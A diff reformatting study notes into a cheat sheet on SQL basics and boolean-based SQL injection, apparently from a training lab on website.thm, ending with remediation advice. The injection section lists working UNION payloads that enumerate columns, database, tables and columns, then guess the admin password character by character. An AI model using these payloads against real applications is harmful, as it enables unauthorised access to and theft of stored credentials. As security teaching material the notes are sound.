@@ -1,248 +1,162 @@
-Statements:
+# 🧾 SQL Statements & Boolean-Based Injection Cheat Sheet
 
-select * from users;
+## 📌 Basic `SELECT` Statements
 
+```sql
+SELECT * FROM users;
+SELECT username, password FROM users;
+SELECT * FROM users LIMIT 1;
+SELECT * FROM users WHERE username = 'admin';
+SELECT * FROM users WHERE username != 'admin';
+SELECT * FROM users WHERE username = 'admin' OR username = 'jon';
+SELECT * FROM users WHERE username = 'admin' AND password = 'p4ssword';
+```
 
-select username,password from users;
+### Using `LIKE`
 
+```sql
+SELECT * FROM users WHERE username LIKE 'a%';
+-- Returns users beginning with 'a'
 
-select * from users LIMIT 1;
+SELECT * FROM users WHERE username LIKE '%n';
+-- Returns users ending with 'n'
 
+SELECT * FROM users WHERE username LIKE '%mi%';
+-- Returns users containing 'mi'
+```
 
-select * from users where username='admin';
+## 🔀 `UNION` Statement
 
+```sql
+SELECT name, address, city, postcode FROM customers
+UNION
+SELECT company, address, city, postcode FROM suppliers;
+```
 
-select * from users where username != 'admin';
+- Combines results from two `SELECT` statements.
+- Must return the **same number of columns** with **matching data types** and **order**.
 
+## ➕ `INSERT` Statement
 
-select * from users where username='admin' or username='jon';
+```sql
+INSERT INTO users (username, password) VALUES ('bob', 'password123');
+```
 
+- `INTO users` → target table
+- `(username, password)` → columns
+- `VALUES (...)` → actual data
 
-select * from users where username='admin' and password='p4ssword';
+## 📝 `UPDATE` Statement
 
+```sql
+UPDATE users SET username = 'root', password = 'pass123' WHERE username = 'admin';
+```
 
-select * from users where username like 'a%';
-This returns any rows with a username beginning with the letter a.
+- Updates rows where the condition matches.
 
+## ❌ `DELETE` Statement
 
-select * from users where username like '%n';
-This returns any rows with a username ending with the letter n.
+```sql
+DELETE FROM users WHERE username = 'martin';
+DELETE FROM users;
+-- ⚠️ Without a WHERE clause, deletes ALL rows!
+```
 
+---
 
-select * from users where username like '%mi%';
-This returns any rows with a username containing the characters mi within them.
+## 🌐 Blog Entry Example (with SQL context)
 
-
-SELECT name,address,city,postcode from customers UNION SELECT company,address,city,postcode from suppliers;
-The UNION statement combines the results of two or more SELECT statements to retrieve data from either single or multiple tables; 
-the rules to this query are that the UNION statement must retrieve the same number of columns in each SELECT statement, the columns have to be of a similar data type, and the column order has to be the same.
-
-
-
-Using the following SQL Statement, we can gather the results from the two tables and put them into one result set:
-
-SELECT name,address,city,postcode from customers UNION SELECT company,address,city,postcode from suppliers;
-
-
-
-
-INSERT
-The INSERT statement tells the database we wish to insert a new row of data into the table.
-
-insert into users (username,password) values ('bob','password123');
-
-"into users" tells the database which table we wish to insert the data into, "(username,password)" provides the columns we are providing data for 
-and then "values ('bob','password');" provides the data for the previously specified columns.
-
-
-
-
-UPDATE
-The UPDATE statement tells the database we wish to update one or more rows of data within a table. You specify the table you wish to update using "update %tablename% SET" 
-and then select the field or fields you wish to update as a comma-separated list such as "username='root',password='pass123'" then finally, similar to the SELECT statement, 
-you can specify exactly which rows to update using the where clause such as "where username='admin;".
-
-update users SET username='root',password='pass123' where username='admin';
-
-
-
-
-DELETE
-The DELETE statement tells the database we wish to delete one or more rows of data. 
-
-delete from users where username='martin';
-
-
-delete from users;
-Because no WHERE clause was being used in the query, all the data was deleted from the table.
-
-
-
-
-
-
-
-The URL for each blog entry may look something like this:
-
+```
 https://website.thm/blog?id=1
+```
 
-SELECT * from blog where id=1 and private=0 LIMIT 1;
- the SQL statement above is looking in the blog table for an article with the id number of 1 and the private column set to 0
+```sql
+SELECT * FROM blog WHERE id = 1 AND private = 0 LIMIT 1;
+```
 
+---
 
+## 🛠️ Boolean-Based SQL Injection
 
+Used to extract data via true/false logic (e.g., response contains `{"taken": true}`).
 
+### ✅ Step 1: Find Number of Columns
 
+Try increasing columns in a `UNION` until you succeed:
 
+```sql
+admin123' UNION SELECT 1;--         → false
+admin123' UNION SELECT 1,2;--       → false
+admin123' UNION SELECT 1,2,3;--     → ✅ true (3 columns)
+```
 
+### 🧠 Step 2: Find Database Name
 
+```sql
+admin123' UNION SELECT 1,2,3 WHERE database() LIKE '%';--   → true
+admin123' UNION SELECT 1,2,3 WHERE database() LIKE 's%';--  → ✅
+```
 
-Boolean-based SQL Injection to extract info from the database one piece at a time using true/false results (based on whether {"taken": true} is returned).
+Eventually reveals: `sqli_three`
 
-You’re on a site that checks if a username is already taken:
+### 🗂️ Step 3: Find Table Name
 
-    https://website.thm/checkuser?username=admin
-
-    If the name exists, it returns:
-    {"taken": true}
-    If not, it returns:
-    {"taken": false}
-
-This means true/false responses show us if our injection works.
-
-
-✅ Step 1: Find how many columns are in the SQL query
-
-We try UNION SELECT with increasing numbers of values until it works:
-
-Try:
-
-admin123' UNION SELECT 1;--
-
-→ false
-
-Try:
-
-admin123' UNION SELECT 1,2;--
-
-→ false
-
-Try:
-
-admin123' UNION SELECT 1,2,3;--
-
-→ true ✅
-➡️ So: 3 columns
-
-
-
-
-🧠 Step 2: Find the database name
-
-Use this:
-
-admin123' UNION SELECT 1,2,3 WHERE database() like '%';--
-
-→ true (matches anything)
-
-Try letters:
-
-admin123' UNION SELECT 1,2,3 WHERE database() like 's%';--
-
-→ true ✅
-Try more letters (like sq%, sql%, etc) until you discover:
-
-sqli_three
-
-
-
-
-🗂️ Step 3: Find the table name
-
-Now you check what tables exist in the database sqli_three:
-
+```sql
 admin123' UNION SELECT 1,2,3 FROM information_schema.tables 
-WHERE table_schema = 'sqli_three' and table_name like 'u%';--
+WHERE table_schema = 'sqli_three' AND table_name LIKE 'u%';-- → ✅
+```
 
-→ true ✅
-Eventually you find the table:
+Reveals table: `users`
 
-users
+### 📋 Step 4: Find Column Names
 
-
-
-📋 Step 4: Find the column names in the users table
-
-Same idea, different table:
-
+```sql
 admin123' UNION SELECT 1,2,3 FROM information_schema.columns 
-WHERE table_schema='sqli_three' and table_name='users' 
-and column_name like 'u%';--
+WHERE table_schema = 'sqli_three' AND table_name = 'users' 
+AND column_name LIKE 'u%';--
+```
 
-Repeat with different letters and exclude ones you've already found using:
+- Use exclusions to avoid repeats:  
+  `... AND column_name != 'id'`
 
-... and column_name != 'id'
+Eventually find columns:
 
-Eventually, you'll find:
-
+```text
 id, username, password
+```
 
+### 🔐 Step 5: Extract Data
 
+```sql
+admin123' UNION SELECT 1,2,3 FROM users WHERE username LIKE 'a%';--  → find: admin
+admin123' UNION SELECT 1,2,3 FROM users WHERE username = 'admin' AND password LIKE '3%';--
+```
 
+---
 
-🔐 Step 5: Find the actual data
+## 🛠️ Tools That Automate Boolean-Based SQLi
 
-Now you're ready to look inside the users table!
-✅ Find a username:
+- `sqlmap`
 
-admin123' UNION SELECT 1,2,3 FROM users WHERE username like 'a%;--
+---
 
-→ keep guessing letters until you find:
+## 🛡️ Remediation Strategies
 
-admin
+### ✅ Use Prepared Statements
 
-🔑 Find the password:
+- Define SQL structure first
+- Add user input as parameters
 
-admin123' UNION SELECT 1,2,3 FROM users 
-WHERE username='admin' and password like '3%';--
+### ✅ Input Validation
 
+- Use **allowlists**
+- Filter disallowed characters (`'`, `"`, `\`, `$`, etc.)
 
+### ✅ Escape User Input
 
+- Escape special characters (e.g., `'` becomes `\'`) to prevent them from being parsed as SQL code
 
-
-
-
-Tools That Automate Boolean-based SQL Injection:
-🔹 sqlmap
-
-
-
-
-
-
-Remediation
-
-As impactful as SQL Injection vulnerabilities are, developers do have a way to protect their web applications from them by following the advice below:
-
-
-Prepared Statements (With Parameterized Queries):
-
-In a prepared query, the first thing a developer writes is the SQL query, and then any user inputs are added as parameters afterwards. 
-Writing prepared statements ensures the SQL code structure doesn't change and the database can distinguish between the query and the data. As a benefit, it also makes your code look much cleaner and easier to read.
-
-
-Input Validation:
-
-Input validation can go a long way to protecting what gets put into an SQL query. Employing an allow list can restrict input to only certain strings, 
-or a string replacement method in the programming language can filter the characters you wish to allow or disallow. 
-
-
-Escaping User Input:
-
-Allowing user input containing characters such as ' " $ \ can cause SQL Queries to break or, even worse, as we've learnt, open them up for injection attacks. 
-Escaping user input is the method of prepending a backslash (\) to these characters, which then causes them to be parsed just as a regular string and not a special character.
-
-
+---
 
 
 
